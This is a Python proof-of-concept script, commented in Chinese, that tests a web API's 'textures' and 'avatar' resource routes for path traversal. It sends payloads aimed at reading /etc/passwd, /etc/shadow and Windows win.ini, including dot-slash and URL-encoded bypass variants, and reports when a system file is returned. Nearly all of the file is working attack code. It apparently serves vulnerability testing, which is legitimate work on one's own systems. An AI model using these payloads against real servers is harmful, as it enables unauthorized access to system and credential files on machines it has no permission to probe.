import requests
import sys

# 目标服务器地址（根据实际情况修改）
BASE_URL = "http://localhost/api/zako/res"

def test_traversal(target_type, malicious_path):
    """
    发送路径遍历请求并检查响应
    :param target_type: "textures" 或 "avatar"（avatar 分支有长度限制，较难利用）
    :param malicious_path: 要注入的路径片段，如 "../../../etc/passwd"
    """
    # 构造完整 URL，注意 data 参数会被直接拼接到文件名前缀后
    url = f"{BASE_URL}/{target_type}/{malicious_path}"
    print(f"[*] 测试 URL: {url}")

    try:
        # 发送 GET 请求，禁用重定向以便观察原始响应
        resp = requests.get(url, allow_redirects=False, timeout=5)

        print(f"    状态码: {resp.status_code}")
        print(f"    Content-Type: {resp.headers.get('Content-Type', 'N/A')}")

        # 检查是否成功读取到了敏感文件
        content_sample = resp.text[:200] if resp.text else "(空内容)"
        print(f"    响应体前200字符: {content_sample}")

        # 简单判断是否可能存在漏洞
        if resp.status_code == 200:
            # 对于 Linux，检查 /etc/passwd 的特征
            if "root:" in resp.text:
                print("    [!] 漏洞确认：成功读取 /etc/passwd 文件！")
                return True
            # 对于 Windows，检查 win.ini 特征
            if "[fonts]" in resp.text.lower() or "for 16-bit app support" in resp.text.lower():
                print("    [!] 漏洞确认：成功读取 Windows 系统文件！")
                return True
            # 如果返回的是图片二进制，尝试检测 PNG 头
            if resp.content[:4] == b'\x89PNG':
                print("    [-] 返回了一个 PNG 文件（可能是默认占位图），漏洞可能不存在。")
            else:
                print("    [?] 返回了200但未识别为已知敏感文件，请手动检查响应内容。")
                return False
        elif resp.status_code == 400:
            print("    [-] 请求被拒绝（400），输入可能被过滤或长度不符。")
        elif resp.status_code == 404:
            print("    [-] 文件未找到（404），路径无效或不存在该文件。")
        else:
            print(f"    [-] 收到未预期的状态码 {resp.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"    [!] 请求异常: {e}")

    return False

def main():
    print("=== 路径遍历漏洞测试 ===")
    # 针对 textures 分支的测试向量（hash- 前缀 + 用户输入）
    textures_payloads = [
        "../../../../etc/passwd",                     # Linux 经典文件
        "..\\..\\..\\..\\windows\\win.ini",           # Windows 经典文件
        "../../../etc/shadow",                        # 更高权限文件（通常无权限）
        "....//....//....//etc/passwd",               # 变种绕过
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL 编码绕过
    ]

    # avatar 分支要求 data 长度恰好为 32 才能进入正常逻辑，否则会返回 400，
    # 因此很难直接利用，这里只做基本尝试。
    avatar_payloads = [
        "A" * 29 + "../",  # 32 长度但包含路径符号，会被拼接为 UA-<data>.png
    ]

    # 先测试 textures 分支
    print("\n--- 测试 textures 分支 ---")
    found = False
    for payload in textures_payloads:
        found = test_traversal("textures", payload)
        if found:
            break

    if not found:
        print("\n--- 测试 avatar 分支（概率较低） ---")
        for payload in avatar_payloads:
            test_traversal("avatar", payload)

if __name__ == "__main__":
    main()